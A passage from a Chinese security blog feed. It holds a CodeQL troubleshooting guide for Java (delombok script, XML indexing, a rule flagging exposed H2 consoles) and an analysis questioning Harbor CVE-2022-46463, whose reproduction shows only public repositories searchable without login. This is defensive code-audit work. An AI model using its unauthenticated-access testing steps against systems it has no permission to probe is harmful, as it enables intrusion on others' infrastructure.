class="name">addOutputDirectory</span>&gt;</span>false<span class="tag">&lt;/<span class="name">addOutputDirectory</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">outputDirectory</span>&gt;</span>$&#123;project.basedir&#125;/src/main/lombok<span class="tag">&lt;/<span class="name">outputDirectory</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于将所有的还原lombok指向目录/src/main/lombok，所以在maven编译的时候，我们希望编译的是lombok还原后的目录，这样codeql才能够读取整个有效的过程，所以需要修改sourceDirectory</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>$&#123;project.basedir&#125;/src/main/lombok</span><br><span class="line">        <span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">        ......</span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里提供一个脚本, 快速插入lombok-plugins，将脚本放置项目根目录并运行<code>python3 delombok.py ./pom.xml </code>即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delbankline</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = [x <span class="keyword">for</span> x <span class="keyword">in</span> f.readlines() <span class="keyword">if</span> <span class="keyword">not</span> re.search(<span class="string">r&#x27;^\s+$&#x27;</span>, x)]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fw:</span><br><span class="line">        fw.writelines(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delombok</span>(<span class="params">file</span>):</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">lines = f.readlines()</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line">f.truncate()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"><span class="comment"># f.write(line.replace(&#x27;src/main/java&#x27;, &#x27;src/main/lombok&#x27;))</span></span><br><span class="line">line = line.replace(<span class="string">&quot;&lt;directory&gt;$&#123;project.basedir&#125;/src/main&lt;/directory&gt;&quot;</span>,</span><br><span class="line"><span class="string">&quot;&lt;directory&gt;$&#123;project.basedir&#125;/src/main/lombok&lt;/directory&gt;&quot;</span>)</span><br><span class="line">line = line.replace(<span class="string">&#x27;src/main/java&#x27;</span>, <span class="string">&#x27;src/main/lombok&#x27;</span>)</span><br><span class="line">f.write(line)</span><br><span class="line"></span><br><span class="line">tree = ET.ElementTree()</span><br><span class="line"><span class="comment"># 去掉ns0标签</span></span><br><span class="line">XML_NS_NAME = <span class="string">&quot;&quot;</span></span><br><span class="line">XML_NS_VALUE = <span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">ET.register_namespace(XML_NS_NAME, XML_NS_VALUE)</span><br><span class="line">tree.parse(file)</span><br><span class="line">root = tree.getroot()</span><br><span class="line">pre = (re.split(<span class="string">&#x27;project&#x27;</span>, root.tag))[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 生成元素</span></span><br><span class="line">sourceDirectory = ET.Element(<span class="string">&quot;sourceDirectory&quot;</span>)</span><br><span class="line">goal = ET.Element(<span class="string">&quot;goal&quot;</span>)</span><br><span class="line">phase = ET.Element(<span class="string">&quot;phase&quot;</span>)</span><br><span class="line">groupId = ET.Element(<span class="string">&quot;groupId&quot;</span>)</span><br><span class="line">artifactId = ET.Element(<span class="string">&quot;artifactId&quot;</span>)</span><br><span class="line">version = ET.Element(<span class="string">&quot;version&quot;</span>)</span><br><span class="line"><span class="comment"># 赋值</span></span><br><span class="line">sourceDirectory.text = <span class="string">&quot;$&#123;project.basedir&#125;/src/main/lombok&quot;</span></span><br><span class="line">goal.text = <span class="string">&quot;delombok&quot;</span></span><br><span class="line">phase.text = <span class="string">&quot;generate-sources&quot;</span></span><br><span class="line">groupId.text = <span class="string">&quot;org.projectlombok&quot;</span></span><br><span class="line">artifactId.text = <span class="string">&quot;lombok-maven-plugin&quot;</span></span><br><span class="line">version.text = <span class="string">&quot;1.18.4.0&quot;</span></span><br><span class="line"><span class="comment"># 打包</span></span><br><span class="line">goals = ET.Element(<span class="string">&quot;goals&quot;</span>)</span><br><span class="line">goals.append(goal)</span><br><span class="line">addOutputDirectory = ET.Element(<span class="string">&quot;addOutputDirectory&quot;</span>)</span><br><span class="line">addOutputDirectory.text = <span class="string">&quot;false&quot;</span></span><br><span class="line">sourceDirectory2 = ET.Element(<span class="string">&quot;sourceDirectory&quot;</span>)</span><br><span class="line">sourceDirectory2.text = <span class="string">&quot;src/main/java&quot;</span></span><br><span class="line">outputDirectory = ET.Element(<span class="string">&quot;outputDirectory&quot;</span>)</span><br><span class="line">outputDirectory.text = <span class="string">&quot;$&#123;project.basedir&#125;/src/main/lombok&quot;</span></span><br><span class="line">encoding = ET.Element(<span class="string">&quot;encoding&quot;</span>)</span><br><span class="line">encoding.text = <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">configuration = ET.Element(<span class="string">&quot;configuration&quot;</span>)</span><br><span class="line">configuration.append(encoding)</span><br><span class="line">configuration.append(addOutputDirectory)</span><br><span class="line">configuration.append(sourceDirectory2)</span><br><span class="line">configuration.append(outputDirectory)</span><br><span class="line">execution = ET.Element(<span class="string">&quot;execution&quot;</span>)</span><br><span class="line">execution.append(phase)</span><br><span class="line">execution.append(goals)</span><br><span class="line">execution.append(configuration)</span><br><span class="line">executions = ET.Element(<span class="string">&quot;executions&quot;</span>)</span><br><span class="line">executions.append(execution)</span><br><span class="line">plugin = ET.Element(<span class="string">&quot;plugin&quot;</span>)</span><br><span class="line">plugin.append(groupId)</span><br><span class="line">plugin.append(artifactId)</span><br><span class="line">plugin.append(version)</span><br><span class="line">plugin.append(executions)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多条件判断</span></span><br><span class="line">build = root.find(pre + <span class="string">&quot;build&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> build <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">build = ET.Element(<span class="string">&quot;build&quot;</span>)</span><br><span class="line">root.append(build)</span><br><span class="line">build.insert(<span class="number">0</span>, sourceDirectory)</span><br><span class="line">plugins = build.find(pre + <span class="string">&quot;plugins&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> plugins <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">plugins = ET.Element(<span class="string">&quot;plugins&quot;</span>)</span><br><span class="line">build.insert(<span class="number">0</span>, plugins)</span><br><span class="line">plugins.insert(<span class="number">0</span>, plugin)</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">tree.write(file, encoding=<span class="string">&quot;utf-8&quot;</span>, xml_declaration=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">relombok</span>(<span class="params">file</span>):</span><br><span class="line"><span class="comment">#删除自带的Lombok插件</span></span><br><span class="line">tree = ET.ElementTree()</span><br><span class="line"><span class="comment"># 去掉ns0标签</span></span><br><span class="line">XML_NS_NAME = <span class="string">&quot;&quot;</span></span><br><span class="line">XML_NS_VALUE = <span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="line">ET.register_namespace(XML_NS_NAME, XML_NS_VALUE)</span><br><span class="line">tree.parse(file)</span><br><span class="line">root = tree.getroot()</span><br><span class="line">pre = (re.split(<span class="string">&#x27;project&#x27;</span>, root.tag))[<span class="number">0</span>]</span><br><span class="line">build = root.find(pre + <span class="string">&quot;build&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> build <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">plugins = build.find(pre + <span class="string">&quot;plugins&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> plugins <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(plugins)==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">for</span> plugin <span class="keyword">in</span> plugins:</span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> plugin:</span><br><span class="line"><span class="keyword">if</span> child.text == <span class="string">&quot;lombok-maven-plugin&quot;</span>:</span><br><span class="line">plugins.remove(plugin)</span><br><span class="line"><span class="comment"># 写入</span></span><br><span class="line">tree.write(file, encoding=<span class="string">&quot;utf-8&quot;</span>, xml_declaration=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    delbankline(file)</span><br><span class="line">    relombok(file)</span><br><span class="line">    delombok(file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finish!!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="坑II-扩展文件">坑II - 扩展文件</h2><h3 id="场景-2">场景</h3><p>在看官方提供的ql规则时候，有一个特殊的规则引起了注意：<a href="https://github.com/github/codeql/blob/main/java/ql/src/experimental/Security/CWE/CWE-089/MyBatisMapperXmlSqlInjection.ql">MyBatisMapperXmlSqlInjection.ql</a></p><p>他做的事情是扫描Mapper配置Mybatis XML的${}的SQL注入，但是在我们的源代码中，完全没有看到相关的Mybatis的Mapper XML文件。所以规则扫描一直无效。</p><h3 id="原因-2">原因</h3><p>原因归结于我们没有把对应的xml文件加入到我们的数据库中，在默认的配置中，codeql仅加载了四种xml文件，分别为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AndroidManifest.xml</span><br><span class="line">pom.xml</span><br><span class="line">struts.xml</span><br><span class="line">web.xml</span><br></pre></td></tr></table></figure><h3 id="解决方案-2">解决方案</h3><p>结局方案主要有两种方式。<br><strong>1.拆分<code>codeql database create</code></strong><br>这种方式是在官方的Github Issue 发现的，将codeql database create拆分为几个步骤，并在中间的过程增加配置。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">codeql database init --source-root &lt;YourSourcePath&gt; --language java &lt;YourDBPath&gt;</span><br><span class="line">codeql database trace-command --working-dir=&lt;YourSourcePath&gt; &lt;YourDBPath&gt; &lt;BuildCommand&gt;</span><br><span class="line">codeql database index-files --language properties --include-extension .properties --working-dir=&lt;YourSourcePath&gt; --exclude=target &lt;YourDBPath&gt;</span><br><span class="line">codeql database index-files --language xml --include-extension .xml --working-dir=&lt;YourSourcePath&gt; --exclude=target &lt;YourDBPath&gt;</span><br><span class="line">codeql database finalize &lt;YourDBPath&gt;</span><br></pre></td></tr></table></figure><p><strong>2.修改<code>pre-finalize</code></strong><br>这里参考了<a href="https://mp.weixin.qq.com/s/egjA2xFm_ziGHjJ7IxOCbg">楼兰师傅的文章</a>学到了一种新的方式。<br>上面这种方法在日常的使用中很麻烦，每次构建分析前还得运行脚本来构建。因此这种方法与方法1对比，提升了很大的便捷性。</p><p>这种方法只提供xml文件的扩展，如果需要扩展其他类型文件，还需要自己手动增加。(因为 --language 参数不同）</p><p><strong>windows:</strong><br>在codeql-cli/java/tools/pre-finalize.cmd插入<code>--include &quot;**/resources/**/*.xml&quot; ^ </code><br><img src="https://blog.dvkunion.cn/img/16479343916145.jpg" alt=""></p><p><strong>linux:</strong><br>在codeql-cli/java/tools/pre-finalize.sh插入<code>--include &quot;**/resources/**/*.xml&quot;</code><br><img src="https://blog.dvkunion.cn/img/16479342964394.jpg" alt=""></p><p><strong>加入properties扩展：</strong><br>linux为例：<br>在codeql-cli/java/tools/pre-finalize.sh的结尾找到：<code>if [ &quot;$&#123;LGTM_INDEX_PROPERTIES_FILES:-false&#125;&quot; == &quot;true&quot; ]</code><br>删除掉这个if判断，即可默认加载properties。</p><p>注意，这种方法都加入了size-limit的限制，.xml默认限制10MB，.properties默认限制5MB。</p><h2 id="坑III-分析缓慢">坑III - 分析缓慢</h2><h3 id="场景-3">场景</h3><p>在一些巨型项目中，一次构建+分析可能需要花费10-15分钟，如果在构建的过程中发现忘记加载某些文件，这个过程就要再来一次，重复几次，一天的时间就无了。</p><h3 id="原因-3">原因</h3><p>大型的项目构建速度缓慢，规则分析也很缓慢。</p><h3 id="解决方案-3">解决方案</h3><p><strong>使用mvnd 来代替mvn提速</strong><br>因为我测试的项目大部分使用mvn管理，而在codeql中，mvn默认的构建命令为：<br><code>mvn clean package -f &quot;pom.xml&quot; -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true </code></p><p>首先下载并安装<a href="https://github.com/apache/maven-mvnd">mvnd</a>, 官方的手册已经比较清晰。</p><p>然后修改codeql构建命令，并使用mvnd进行构建<br><code>codeql database create codeqlDB --language=java --command=&quot;mvnd clean package -f &quot;pom.xml&quot; -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true</code></p><p>如果mvnd没有配置的话，还需要使用<code>-s settings.xml</code>指定mvn的setting配置文件。</p><p>大概优化的时间在20-30s左右，不同的项目优化效果不同。</p><p><strong>规则分析参数调优</strong><br>对于经常需要用到的规则，codeql支持生成qlo的缓存文件，这样下次再分析其他数据库时，就不需要再次compile而是直接进入规则分析了。<br><code>codeql query compile --warnings=hide --fast-compilation --dump-qlo</code><br>对应目录下会生成规则同名的qlo文件。这样在下次分析这个ql时，codeql会自动找到这个qlo作为缓存，加快了compile的过程。</p><h2 id="优化I-python库">优化I - python库</h2><h3 id="场景-4">场景</h3><p>在经历上述坑点之后，我的数据库构建已经成为了一个很复杂的过程。经常需要各种脚本来辅助。脚本的代码就会出现很丑陋的:<code>os.system(&quot;codeql database xxxxxx ......&quot;)</code>, 令人难以忍受。</p><h3 id="解决方案-4">解决方案</h3><p>偶然在Github发现了一个非官方的<a href="https://github.com/AlexAltea/codeql-python">python-codeql库</a>, 封装了大量常用的codeql操作。<br>安装：<br><code>pip3 install git+https://github.com/AlexAltea/codeql-python.git</code><br>使用：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> codeql</span><br><span class="line"></span><br><span class="line"><span class="comment"># Open databases from files or folders</span></span><br><span class="line">db = codeql.Database(<span class="string">&#x27;path/to/db.zip&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries return a CSV-like array of arrays</span></span><br><span class="line">results = db.query(<span class="string">&#x27;select &quot;Hello&quot;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(results[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries with external libraries are supported as well</span></span><br><span class="line">codeql.set_search_path(<span class="string">&#x27;path/to/codeql&#x27;</span>)</span><br><span class="line">results = db.query(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    import cpp</span></span><br><span class="line"><span class="string">    from BlockStmt block    </span></span><br><span class="line"><span class="string">    select block</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary databases from inlined sources</span></span><br><span class="line">db = codeql.Database.from_cpp(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    int main() &#123;</span></span><br><span class="line"><span class="string">        return 1337 + 1337 + 1337;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">results = db.query(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    import cpp</span></span><br><span class="line"><span class="string">    from Literal literal where</span></span><br><span class="line"><span class="string">        literal.getType() instanceof IntType and</span></span><br><span class="line"><span class="string">        literal.getValue().toInt() = 1337</span></span><br><span class="line"><span class="string">    select literal</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(results[<span class="number">1</span>:]) == <span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="优化II-部分规则Demo">优化II - 部分规则Demo</h2><p>有了坑II的支持，现在已经可以扫描如spring boot内的配置文件了。例如H2-Console的JNDI注入。</p><p>在这个规则中，检测了两个事情：</p><ol><li>是否存在com.h2database.h2这个jar.</li><li>是否开启了spring.h2.console.enabled</li></ol><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.configfiles.ConfigFiles</span><br><span class="line">import semmle.code.xml.MavenPom</span><br><span class="line"></span><br><span class="line">private class H2databaseDependency extends Dependency &#123;</span><br><span class="line">  H2databaseDependency() &#123;</span><br><span class="line">    this.getAChild(&quot;groupId&quot;).getTextValue() <span class="operator">=</span> &quot;com.h2database&quot; <span class="keyword">and</span></span><br><span class="line">    this.getAChild(&quot;artifactId&quot;).getTextValue() <span class="operator">=</span> &quot;h2&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ApplicationProperties extends ConfigPair &#123;</span><br><span class="line">  ApplicationProperties() &#123; this.getFile().getBaseName() <span class="operator">=</span> &quot;application.properties&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> H2databaseDependency dependency, ApplicationProperties ap</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  ap.getFile()</span><br><span class="line">      .getParentContainer()</span><br><span class="line">      .getAbsolutePath()</span><br><span class="line">      .<span class="keyword">matches</span>(dependency.getFile().getParentContainer().getAbsolutePath() <span class="operator">+</span> &quot;%&quot;) <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">exists</span>( <span class="operator">|</span></span><br><span class="line">    ap.getNameElement().getName() <span class="operator">=</span> &quot;spring.h2.console.enabled&quot; <span class="keyword">and</span></span><br><span class="line">    ap.getValueElement().getValue() <span class="operator">=</span> &quot;true&quot;</span><br><span class="line">  ) <span class="keyword">and</span></span><br><span class="line">  <span class="keyword">not</span> ap.getFile().getAbsolutePath().<span class="keyword">matches</span>(&quot;%test/resources%&quot;)</span><br><span class="line"><span class="keyword">select</span> ap, &quot;该配置存在H2 Database JNDI注入漏洞&quot;</span><br></pre></td></tr></table></figure><p>这里只是抛砖引玉，有了配置文件，可以快速的对比SCA，来检查是否使用了存在漏洞的三方jar包。</p><h2 id="结尾">结尾</h2><p>暂时想到的就这些，还有一些从网络上学到的一些小东西就不丢人现眼了...如果有错误或其他的一些小tips，恳求各位师傅指点一二🙇。</p><h4 id="参考链接">参考链接</h4><blockquote><p>1.Github Issue : <a href="https://github.com/github/codeql/issues/8363">https://github.com/github/codeql/issues/8363</a><br>2.Github Issue : <a href="https://github.com/github/codeql/issues/4984#:~:text=Unfortunately%20Lombok%20does%20not%20work%20with%20the%20CodeQL,the%20source%20files%20before%20running%20CodeQL%20as%20follows%3A">https://github.com/github/codeql/issues/4984#:~:text=Unfortunately Lombok does not work with the CodeQL,the source files before running CodeQL as follows%3A</a><br>3.MyBatisMapperXmlSqlInjection.ql : <a href="https://github.com/github/codeql/blob/main/java/ql/src/experimental/Security/CWE/CWE-089/MyBatisMapperXmlSqlInjection.ql">https://github.com/github/codeql/blob/main/java/ql/src/experimental/Security/CWE/CWE-089/MyBatisMapperXmlSqlInjection.ql</a><br>4.楼兰师傅的文章 : <a href="https://mp.weixin.qq.com/s/egjA2xFm_ziGHjJ7IxOCbg">https://mp.weixin.qq.com/s/egjA2xFm_ziGHjJ7IxOCbg</a><br>7.mvnd : <a href="https://github.com/apache/maven-mvnd">https://github.com/apache/maven-mvnd</a><br>8.python-codeql库 : <a href="https://github.com/AlexAltea/codeql-python">https://github.com/AlexAltea/codeql-python</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;CodeQL 踩坑指南 - Java&lt;/h1&gt;
&lt;!-- split --&gt;
&lt;p&gt;讲解这东西的大师傅们太多了，不班门弄斧了，这里仅针对一些踩过的坑点提供一些自己的解决方案，希望能对一些师傅提供点帮助。&lt;/p&gt;</summary>
    
    
    
    <category term="Coding" scheme="http://blog.dvkunion.cn/categories/Coding/"/>
    
    
    <category term="WEB" scheme="http://blog.dvkunion.cn/tags/WEB/"/>
    
    <category term="代码审计" scheme="http://blog.dvkunion.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Harbor 未授权漏洞的背后是魔幻的荒诞主义</title>
    <link href="http://blog.dvkunion.cn/2022/01/19/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%83%8C%E5%90%8E%E6%98%AF%E9%AD%94%E5%B9%BB%E7%9A%84%E8%8D%92%E8%AF%9E%E4%B8%BB%E4%B9%89/"/>
    <id>http://blog.dvkunion.cn/2022/01/19/Harbor%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%83%8C%E5%90%8E%E6%98%AF%E9%AD%94%E5%B9%BB%E7%9A%84%E8%8D%92%E8%AF%9E%E4%B8%BB%E4%B9%89/</id>
    <published>2022-01-19T13:12:11.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>Harbor 未授权漏洞的背后是魔幻的荒诞主义</h1><h2 id="前言">前言</h2><p>怎么说呢，心里五味杂陈，面对在大年前横空而来的 <code>CVE-2022-46463</code>，以及一通测试复现后，面对着电脑屏幕久久说不出话来，于是便有了这篇文章。突然感觉安全已经进入到了一个魔幻的荒诞主义：我们还有什么可信的东西？</p><p>大家可以当作一篇小说看看吧。</p><h2 id="事情经过">事情经过</h2><p>事情要从我的一个安全朋友说起。</p><h3 id="起因">起因</h3><p>1.16日，天高气爽，想着还有两天就要放假回家过年的心，根本无法集中在工作中，于是在摸鱼冲浪的时候，突然发现了一篇紧急通告，</p><blockquote><p>CVE-2022-46463 漏洞预警</p></blockquote><p>很快啊，赶紧点进去一看，发现是一个名为<code>harbor</code>的未授权漏洞，<strong>私有</strong> 和 <strong>公开</strong> 仓库镜像可以被未授权获取，可能导致敏感信息泄漏。</p><p>一打眼看到的漏洞评级 <code>严重</code> 吓了一激灵，并且显示<code>POC</code>已经在野利用了？还两天过年了，要是这么严重的问题，还怎么安心回家过这个团圆？</p><p>由此，开启了一段魔幻的 &quot;漏洞&quot; 修复过程。</p><h3 id="追踪">追踪</h3><p>根据互联网的信息，发现各平台预警，除<code>CVE</code>外，所有链接均指向了一个 <code>github</code> 仓库，</p><blockquote><p><a href="https://github.com/lanqingaa/123">https://github.com/lanqingaa/123</a></p></blockquote><p>在这个<code>github</code>仓库里，标记的很清楚的复现步骤啊：通过登录页面的搜索接口，可以搜索到显示为 <code>私有</code> 项目的仓库。</p><p>这还是挺吓人的，利用方式简单、影响严重，可能会导致公司几千个私有镜像被他人获取，后果不堪设想。</p><p>按照cve给出的影响范围：</p><blockquote><p>1.x &lt;= Harbor &lt;= 2.5.3</p></blockquote><p>很不幸，自家的harbor正好在范围内，看来年前又要找运维大哥去帮忙修复了。</p><h3 id="坎坷的复现">坎坷的复现</h3><p>去找运维大哥帮忙，作为安全人员，肯定先要自己搞明白了再去摇人，于是就拿着公司的harbor尝试了一下，发现好像有点不对劲： 不论我怎么搜索，从 <code>a-z</code>都只能显示<strong>公开</strong>仓库的数据，并无漏洞所描述的 <strong>私有</strong>仓库数据。</p><p>会不会是复现的步骤有问题？又重新读了一遍整体的逻辑，会不会是我们公司的仓库就没有 <strong>私有</strong> 属性的呢？</p><p>赶紧去和运维大哥确认了一下，发现的确存在 <strong>私有</strong> 镜像，可为什么这个漏洞却搜不到呢？</p><p>怀着窘迫的心在<code>harbor</code> 官方仓库不断寻找，发现，好像官方也没对这个漏洞进行相关 <code>fix</code>的提交记录哎，那预警里面的 <code>请升级到最新版本</code> 是如何得出的呢？</p><p>一定是自己功夫还不够深，一定是自己的姿势还不太对，此时的菜鸡的安全人员还没有意识到问题的严重性和魔幻性，依旧还在自身寻找问题。</p><h3 id="反转">反转</h3><p>1.17日，复现一天无果的安全人员，气急败坏只能继续摸鱼，然后发现了另一篇通告：</p><blockquote><p>关于Habor CVE-2022-46463的说明</p></blockquote><p>文章大概就是经过测试，所有版本都没有搜索到私有仓库；同时还分析了<code>search</code> api 的认证逻辑。官方手册指出 公开仓库 能够被搜索到，属于产品特性。这个CVE甚至称不上是漏洞。</p><p>事情开始变得魔幻起来了。</p><h3 id="未完待续">未完待续</h3><p>从事情开始出现反转后，便开始出现了各路声音：有人为这个漏洞就不该出现CVE的；有认为Harbor设计不合理的，就因该算Harbor的漏洞；有认为Harbor应该修改默认选项来避免出现滥用的不安全配置的，等等等等。</p><p>截止至发文今日，搜索该CVE编号，依旧能够发现大量的&quot;安全公告&quot;,无一例外都是相同的漏洞描述，相同的影响范围，相同的修复建议。</p><p>我们仍未知道那天所看见的cve的名字。</p><h2 id="来关注漏洞">来关注漏洞</h2><p>故事讲完了，我们来实际关注下漏洞。</p><p>根据 <code>https://github.com/lanqingaa/123</code> 所描述的<code>poc</code>, <code>harbor</code> v1 v2版本均存在该问题，但是自己观察会发现，该作者在v1的截图中的确搜到了显示为 <code>private</code> 的仓库：<br><img src="https://blog.dvkunion.cn/img/16740212582611.jpg" alt=""></p><p>但是在 v2 的版本中，他给出的结果却是 <code>public</code> 仓库。<br><img src="https://blog.dvkunion.cn/img/16740213120010.jpg" alt=""></p><p>再回看漏洞描述：</p><blockquote><p>Harbor 中存在访问控制错误问题，允许攻击者无需身份验证即可访问公共和私有镜像存储库的所有信息，并拉取镜像。</p></blockquote><h3 id="理清逻辑">理清逻辑</h3><p>首先要明确一下几个点：</p><ul><li>第一，私有化仓库到底能不能像漏洞所描述的那样，被搜索发现？</li><li>第二，仅能访问到公开仓库，是否还能被称之为漏洞？</li></ul><p>如果第一点成立，那么 <code>CVE-2022-46463</code> 无疑是一个高危漏洞，未认证户通过该漏洞可以获取到了认证用户的权限，明显的越权问题。</p><p>如果第一点不成立，也就是该接口只能获取到公开仓库的情景下，问题自然而然的来到了第二点：如果仅能够访问到公开仓库的信息，是否还存在风险呢？</p><p>在讨论第二点的同时，我们还需要预先讨论一个问题：</p><ul><li>公开仓库的概念到底是面向所有认证用户还是所有用户？</li></ul><p>带着这几个问题，我们亲自去复现一波这个魔幻的 <code>CVE-2022-46463</code></p><h3 id="复现">复现</h3><h4 id="v2">v2</h4><p>因为目前harbor的release多数为v2, 就先使用v2的版本进行了复现：</p><p>首先我们用权限账户登陆，可以看到仓库存在 private/public两种项目。<br><img src="https://blog.dvkunion.cn/img/16740218044242.jpg" alt=""></p><p>其中，私有的library内存在如下镜像。</p><p><img src="https://blog.dvkunion.cn/img/16740218419115.jpg" alt=""></p><p>我们退出账户，尝试去搜索：<br><img src="https://blog.dvkunion.cn/img/16740218684380.jpg" alt=""></p><p>毫无结果，再尝试搜索一下公开镜像：<br><img src="https://blog.dvkunion.cn/img/16740218947330.jpg" alt=""><br>确实获取到了列表信息。<br><img src="https://blog.dvkunion.cn/img/16740219359533.jpg" alt=""></p><p>总结: v2仅能够搜索到公开镜像。</p><h4 id="v1">v1</h4><p>在测试无果的情况下，想到：会不会是v1和v2的版本存在差异呢？</p><p>于是我们来尝试，使用和<code>https://github.com/lanqingaa/123</code> 作者完全一致版本的v1进行尝试：<br><img src="https://blog.dvkunion.cn/img/16740185412406.jpg" alt=""></p><p>与v2相同，我们先创建私有的仓库，然后上传测试镜像：</p><p><img src="https://blog.dvkunion.cn/img/16740220897858.jpg" alt=""><br><img src="https://blog.dvkunion.cn/img/16740221142173.jpg" alt=""><br>然后退出登录，尝试搜索私有仓库：<br><img src="https://blog.dvkunion.cn/img/16740185766211.jpg" alt=""><br>无果，再尝试搜索下公开的 <code>library</code> 仓库<br><img src="https://blog.dvkunion.cn/img/16740221399539.jpg" alt=""><br>？？？ 的确出现了私有仓库，但是仔细看？是在管理面板内为<code>public</code>权限的<code>library</code><br><img src="https://blog.dvkunion.cn/img/16740221754902.jpg" alt=""><br>为了更有效的说明这个事情，我们再创建个公开仓库：<br><img src="https://blog.dvkunion.cn/img/16740222082857.jpg" alt=""><br>然后退出登录，再次搜索：<br><img 